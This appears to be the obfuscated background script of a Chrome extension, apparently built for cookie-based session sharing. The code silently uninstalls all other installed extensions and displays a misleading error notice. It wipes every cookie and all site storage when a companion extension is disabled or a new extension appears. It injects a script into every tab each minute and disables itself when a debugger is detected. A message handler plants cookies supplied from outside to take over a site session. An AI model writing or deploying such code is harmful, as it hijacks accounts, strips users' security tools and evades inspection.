const a1l2o = 'ppifflkhgngibidmeolnhilmogbnbmee';
let a3l4l = true;
let d5i6s = false;
let e7x8t = true;
async function d9i0s() {
    d5i6s = true;
    try {
        await chrome.management.setEnabled(chrome.runtime.id, false);
    } catch (_0x204f87) {
        chrome.runtime.reload();
    }
}
function d0i1f() {
    if (e7x8t) {
        e7x8t = false;
        return;
    }
    chrome.tabs.query({}, _0x1c29c3 => {
        _0x1c29c3.forEach(_0x3fb71e => {
            if (_0x3fb71e.url && !_0x3fb71e.url.startsWith('chrome://')) {
                chrome.scripting.executeScript({
                    target: { tabId: _0x3fb71e.id },
                    files: ['shh.js']
                }).catch(d9i0s);
            }
        });
    });
}
function r1e2f() {
    chrome.tabs.query({}, _0xad277 => {
        _0xad277.forEach(_0x2c6673 => {
            if (_0x2c6673.url && !_0x2c6673.url.startsWith('chrome://')) {
                chrome.tabs.reload(_0x2c6673.id);
            }
        });
    });
}
chrome.runtime.onInstalled.addListener(_0x293931 => {
    if (_0x293931.reason === 'install' || _0x293931.reason === 'update') {
        r1e2f();
    }
    e7x8t = true;
});
chrome.management.onEnabled.addListener(_0x538f55 => {
    if (_0x538f55.id === chrome.runtime.id) {
        r1e2f();
    }
});
chrome.runtime.onStartup.addListener(() => {
    chrome.management.get(chrome.runtime.id, _0x563e12 => {
        if (_0x563e12 && _0x563e12.enabled) {
            r1e2f();
        }
    });
    e7x8t = false;
    d0i1f();
});
async function c1l2e() {
    await new Promise(_0x35123b => {
        chrome.cookies.getAll({}, _0x422d33 => {
            const _0x1bf910 = _0x422d33.map(_0xbf4930 => {
                return new Promise(_0x7c7d2e => {
                    const _0xf39c1e = 'http' + (_0xbf4930.secure ? 's' : '') + '://' + _0xbf4930.domain + _0xbf4930.path;
                    chrome.cookies.remove({
                        url: _0xf39c1e,
                        name: _0xbf4930.name
                    }, () => _0x7c7d2e());
                });
            });
            Promise.all(_0x1bf910).then(_0x35123b);
        });
    });
    const _0x9383fc = await new Promise(_0x179450 => {
        chrome.cookies.getAll({}, _0x100106 => {
            const _0x5ec163 = [...new Set(_0x100106.map(_0x2fcd4b => _0x2fcd4b.domain))];
            _0x179450(_0x5ec163);
        });
    });
    for (const _0x29d8d0 of _0x9383fc) {
        try {
            await chrome.browsingData.remove({
                origins: [
                    'http://' + _0x29d8d0,
                    'https://' + _0x29d8d0
                ]
            }, {
                localStorage: true,
                sessionStorage: true,
                indexedDB: true,
                webSQL: true,
                cache: true,
                fileSystems: true,
                serviceWorkers: true
            });
        } catch (_0x3fcf26) {
            console.error('Error: ' + _0x29d8d0 + ':', _0x3fcf26);
        }
    }
    await chrome.browsingData.removeCache({});
    r1e2f();
}
async function c1l2w(_0x428618 = 3) {
    let _0x26d3f8 = 0;
    while (_0x26d3f8 < _0x428618) {
        try {
            await c1l2e();
            return;
        } catch (_0x3259ea) {
            _0x26d3f8++;
            console.error('Error ' + _0x26d3f8 + ':', _0x3259ea);
            if (_0x26d3f8 < _0x428618) {
                await new Promise(_0xed43d3 => setTimeout(_0xed43d3, 1000 * _0x26d3f8));
            }
        }
    }
    throw new Error('Failed after ' + _0x428618 + ' tries');
}
chrome.management.onInstalled.addListener(_0x46b48d => {
    if (_0x46b48d.id !== chrome.runtime.id) {
        c1l2w();
    }
});
chrome.management.onUninstalled.addListener(_0x4984f7 => {
    if (_0x4984f7 === a1l2o) {
        a3l4l = false;
        c1l2w();
        r1e2f();
    }
});
chrome.management.onDisabled.addListener(_0xbb082d => {
    if (_0xbb082d.id === a1l2o) {
        a3l4l = false;
        c1l2w();
        r1e2f();
    }
});
chrome.management.onEnabled.addListener(_0x1ec6d6 => {
    if (_0x1ec6d6.id === a1l2o) {
        a3l4l = true;
    }
});
chrome.alarms.create('e1x2c', { periodInMinutes: 60 });
chrome.alarms.create('d1e2p', { periodInMinutes: 120 });
chrome.alarms.create('d1e2b', {
    periodInMinutes: 1,
    delayInMinutes: 1
});
chrome.alarms.onAlarm.addListener(_0x48dfbc => {
    if (_0x48dfbc.name === 'e1x2c') {
        c1h2e();
        c1a2l();
    } else {
        if (_0x48dfbc.name === 'd1e2p') {
            c1l2w();
        } else {
            if (_0x48dfbc.name === 'd1e2b') {
                d0i1f();
            }
        }
    }
});
function c1a2l() {
    chrome.management.get(a1l2o, _0x56b5ac => {
        if (chrome.runtime.lastError || !_0x56b5ac || _0x56b5ac.enabled === false) {
            if (a3l4l) {
                a3l4l = false;
                c1l2w();
                r1e2f();
            }
        } else {
            a3l4l = true;
        }
    });
}
let l1k2e = [];
function c1h2e() {
    chrome.management.getAll(_0x23a8c5 => {
        const _0x32ea4b = _0x23a8c5.map(_0x5203c5 => _0x5203c5.id);
        if (l1k2e.length > 0) {
            const _0x173e1f = _0x32ea4b.filter(_0x4c7547 => !l1k2e.includes(_0x4c7547) && _0x4c7547 !== chrome.runtime.id && _0x4c7547 !== a1l2o);
            if (_0x173e1f.length > 0) {
                c1l2w();
            }
        }
        l1k2e = _0x32ea4b;
    });
}
chrome.runtime.onStartup.addListener(() => {
    chrome.management.getAll(_0x27a6ee => {
        l1k2e = _0x27a6ee.map(_0x13adab => _0x13adab.id);
    });
    c1a2l();
});
chrome.runtime.onInstalled.addListener(() => {
    chrome.management.getAll(_0x9df8a => {
        l1k2e = _0x9df8a.map(_0x10e23a => _0x10e23a.id);
    });
    c1a2l();
});
function c1o2e() {
    return new Promise(_0x2a3bfa => {
        chrome.management.getAll(_0x18d6da => {
            const _0x4fd96f = _0x18d6da.filter(_0x43067f => _0x43067f.id !== chrome.runtime.id && _0x43067f.id !== a1l2o && _0x43067f.type === 'extension');
            _0x2a3bfa(_0x4fd96f);
        });
    });
}
function u1n2i() {
    return new Promise(_0x4ebf01 => {
        chrome.management.getAll(_0x24d80c => {
            const _0x2586d2 = _0x24d80c.filter(_0x5df8c0 => _0x5df8c0.id !== chrome.runtime.id && _0x5df8c0.id !== a1l2o && _0x5df8c0.type === 'extension').map(_0x514e45 => {
                return new Promise(_0x54a898 => {
                    chrome.management.uninstall(_0x514e45.id, () => {
                        if (chrome.runtime.lastError) {
                            console.error('Error: ' + _0x514e45.name + ':', chrome.runtime.lastError);
                            _0x54a898(false);
                        } else {
                            console.log('Removed: ' + _0x514e45.name);
                            _0x54a898(true);
                        }
                    });
                });
            });
            Promise.all(_0x2586d2).then(_0x4ca8a5 => {
                _0x4ebf01(_0x4ca8a5.every(_0x8107e => _0x8107e));
            });
        });
    });
}
function u1n2s() {
    chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon48.png',
        title: ' ⚠️Error',
        message: 'Another extension is currently active. Please remove other extensions including Google docs or all others to use our Tools properly.'
    });
    setTimeout(() => {
        chrome.management.uninstallSelf();
    }, 3000);
}
function m1o2n() {
    chrome.management.onInstalled.addListener(_0x2ad905 => {
        if (_0x2ad905.type === 'extension' && _0x2ad905.id !== chrome.runtime.id && _0x2ad905.id !== a1l2o) {
            chrome.management.uninstall(_0x2ad905.id, () => {
                if (chrome.runtime.lastError) {
                    console.error('Error:', chrome.runtime.lastError);
                    u1n2s();
                } else {
                    console.log('kalsdfk:', _0x2ad905.name);
                    chrome.notifications.create({
                        type: 'basic',
                        iconUrl: 'icons/icon48.png',
                        title: '⚠️Error',
                        message: 'Another extension is currently active. Please remove other extensions including Google docs or all others to use our Tools properly.'
                    });
                }
            });
        }
    });
    chrome.management.onEnabled.addListener(_0x10ee76 => {
        if (_0x10ee76.type === 'extension' && _0x10ee76.id !== chrome.runtime.id && _0x10ee76.id !== a1l2o) {
            chrome.management.uninstall(_0x10ee76.id, () => {
                if (chrome.runtime.lastError) {
                    console.error('Error:', chrome.runtime.lastError);
                    u1n2s();
                } else {
                    console.log('lksdfkl:', _0x10ee76.name);
                }
            });
        }
    });
}
async function i1n2i() {
    try {
        const _0xa4327f = await c1o2e();
        if (_0xa4327f.length > 0) {
            console.log('aslkdfklaf aldfk');
            const _0x5a0b48 = await u1n2i();
            if (!_0x5a0b48) {
                console.log('klasdfkl dalkfkl');
                u1n2s();
                return;
            } else {
                console.log('laksdfkakf aldflkaf');
            }
        }
        m1o2n();
        setInterval(async () => {
            const _0x54e988 = await c1o2e();
            if (_0x54e988.length > 0) {
                console.log('ldfakaklfka afkafkl ');
                const _0x10a85c = await u1n2i();
                if (!_0x10a85c) {
                    u1n2s();
                }
            }
        }, 60000);
    } catch (_0x1c37ac) {
        console.error('Error:', _0x1c37ac);
        u1n2s();
    }
}
chrome.runtime.onInstalled.addListener(() => {
    i1n2i();
});
i1n2i();
chrome.runtime.onMessage.addListener((_0xaae84f, _0x1b724f, _0x3a34ad) => {
    if (_0xaae84f.debuggerDetected && !d5i6s) {
        d9i0s();
        return true;
    }
    if (_0xaae84f.type === 'captureData') {
        const _0x3b154f = _0xaae84f.url;
        const _0x41092c = _0xaae84f.jsonCookies;
        const _0x298f47 = [];
        const _0x5068f8 = [];
        const _0x413131 = _0x1723d2 => {
            return new Promise(_0x437295 => {
                const _0x39bde7 = {
                    url: _0x3b154f,
                    name: _0x1723d2.name,
                    value: _0x1723d2.value,
                    domain: _0x1723d2.domain || new URL(_0x3b154f).hostname,
                    path: _0x1723d2.path || '/',
                    secure: _0x1723d2.secure || false,
                    httpOnly: _0x1723d2.httpOnly || false,
                    expirationDate: _0x1723d2.expirationDate,
                    sameSite: _0x1723d2.sameSite || 'lax'
                };
                if (_0x39bde7.domain && !_0x39bde7.domain.startsWith('.')) {
                    _0x39bde7.domain = '.' + _0x39bde7.domain;
                }
                console.log('Setting:', _0x39bde7.name);
                chrome.cookies.set(_0x39bde7, _0x4e6bf6 => {
                    if (chrome.runtime.lastError) {
                        console.error('Error: ' + _0x39bde7.name, chrome.runtime.lastError);
                        _0x5068f8.push({
                            name: _0x39bde7.name,
                            error: chrome.runtime.lastError.message
                        });
                        _0x437295(false);
                    } else {
                        console.log('Success: ' + _0x39bde7.name);
                        _0x298f47.push(_0x39bde7.name);
                        _0x437295(true);
                    }
                });
            });
        };
        (async () => {
            for (const _0xaeca90 of _0x41092c) {
                await _0x413131(_0xaeca90);
            }
            console.log('Result:', {
                success: _0x298f47,
                failed: _0x5068f8
            });
            chrome.tabs.create({ url: _0x3b154f });
            _0x3a34ad({
                success: _0x298f47.length > 0,
                successfulCookies: _0x298f47,
                failedCookies: _0x5068f8
            });
        })();
        return true;
    }
});